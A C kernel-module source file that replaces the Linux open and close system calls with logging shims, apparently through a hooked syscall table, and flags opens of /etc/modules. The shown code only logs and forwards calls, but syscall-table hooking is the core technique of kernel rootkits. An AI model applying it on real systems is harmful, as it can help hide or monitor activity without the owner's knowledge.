#include "include.h"
#include "rw.h"
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/fdtable.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/path.h>
#include "syscall.h"
#include "utility.h"
#include "secrets.h"
MODULE_LICENSE("GPL");

int openShim(const char *filename, int flags, umode_t mode) {
	printk(KERN_INFO "openShim %s\n", filename);
	if (filename[0] == '/' && filename[1] == 'e' && filename[2] == 't' && filename[3] == 'c' && filename[4] == '/' && filename[5] == 'm' && filename[6] == 'o') {
		printk(KERN_INFO "openShim ETC MODULES DETECTED\n");
	}
	return ((SYS_open_type)backup_sys_call_table[SYS_open])(filename, flags, mode);
}

int closeShim(unsigned int fd) {
	char* path = kmalloc(256, GFP_KERNEL);
	path[255] = '\0';
	get_path_via_fd(fd, path, 256);
	printk(KERN_INFO "closeShim %s\n", path);
	kfree(path);
	return ((SYS_close_type)backup_sys_call_table[SYS_close])(fd);
}
